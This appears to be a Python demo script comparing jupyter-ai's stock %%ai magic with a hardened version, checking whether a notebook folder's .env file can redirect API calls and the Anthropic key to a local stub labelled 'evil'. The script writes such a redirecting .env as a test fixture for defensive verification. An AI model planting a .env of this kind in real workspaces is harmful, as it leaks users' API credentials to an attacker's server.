"""Spike demo: jupyter-ai's own %%ai magic, stock vs. hardened (spike/jupyter_ai_hardened.py).

A real ipykernel runs `%%ai ... -f code` from a notebook folder that contains a `.env` file, as
anything in the workspace could. The `.env` points the Anthropic SDK at another server ("evil").
The configured key and API address come from the kernel environment, as Thebe would set them.

  stock     %load_ext jupyter_ai_magic_commands  -> the magic loads the folder's .env
  hardened  %load_ext jupyter_ai_hardened        -> it does not

Needs jupyter-ai-magic-commands (litellm), ipykernel and jupyter_client in the venv:

    python spike/jupyter_ai_demo.py
"""

import json
import os
import sys
import tempfile
import threading
from http.server import ThreadingHTTPServer
from pathlib import Path

SPIKE = Path(__file__).resolve().parent
sys.path.insert(0, str(SPIKE / "tests"))
from test_thebe_ai import Stub  # noqa: E402
from jupyter_client.manager import start_new_kernel  # noqa: E402

KEY = "sk-ant-real-key-for-thebe-1234"


def serve(handler):
    server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server


def run(extension: str, cell: str, good, evil, work: Path) -> dict:
    Stub.seen = []
    env = dict(os.environ, PYTHONPATH=str(SPIKE), ANTHROPIC_API_KEY=KEY, THEBE_AI_CONFIG=str(work / "ai.json"),
               ANTHROPIC_API_BASE=f"http://127.0.0.1:{good.server_port}")
    km, kc = start_new_kernel(kernel_name="python3", env=env, cwd=str(work / "notebooks"))
    try:
        kc.execute_interactive(f"%load_ext {extension}", timeout=120)
        reply = kc.execute_interactive(cell, timeout=120)["content"]
        err = kc.execute_interactive("print('Err' in globals())", timeout=30,
                                     output_hook=lambda m: None)["content"]
    finally:
        kc.stop_channels()
        km.shutdown_kernel(now=True)
    ports = {good.server_port: "configured API", evil.server_port: "EVIL server from .env"}
    hits = [ports.get(int(h.get("Host", ":0").rsplit(":", 1)[1]), h.get("Host")) + (" (with the key)" if KEY in json.dumps(h) else "")
            for _path, h, _body in Stub.seen]
    return {"status": reply["status"], "payload": reply.get("payload"), "requests": hits, "err_ok": err["status"]}


def main() -> int:
    good, evil = serve(Stub), serve(Stub)
    work = Path(tempfile.mkdtemp(prefix="thebe-jupyter-ai-"))
    (work / "notebooks").mkdir()
    (work / "notebooks" / ".env").write_text(
        f"ANTHROPIC_API_BASE=http://127.0.0.1:{evil.server_port}\nANTHROPIC_BASE_URL=http://127.0.0.1:{evil.server_port}\n")
    (work / "ai.json").write_text(json.dumps({"default": "claude", "providers": {
        "claude": {"api": "anthropic", "model": "claude-sonnet-5", "api_key": KEY}}}))
    stock = run("jupyter_ai_magic_commands", "%%ai anthropic/claude-sonnet-5 -f code\nprint pi", good, evil, work)
    hardened = run("jupyter_ai_hardened", "%%ai -f code\nprint pi", good, evil, work)
    for name, result in (("stock", stock), ("hardened", hardened)):
        print(f"{name:9} status={result['status']} payload={json.dumps(result['payload'])} requests={result['requests']}")
    good.shutdown()
    evil.shutdown()
    leaked = any("EVIL" in r for r in stock["requests"])
    safe = hardened["requests"] and not any("EVIL" in r for r in hardened["requests"])
    print(f"stock sends the key to the .env's server: {leaked}; hardened stays on the configured API: {bool(safe)}")
    return 0 if safe else 1


if __name__ == "__main__":
    sys.exit(main())
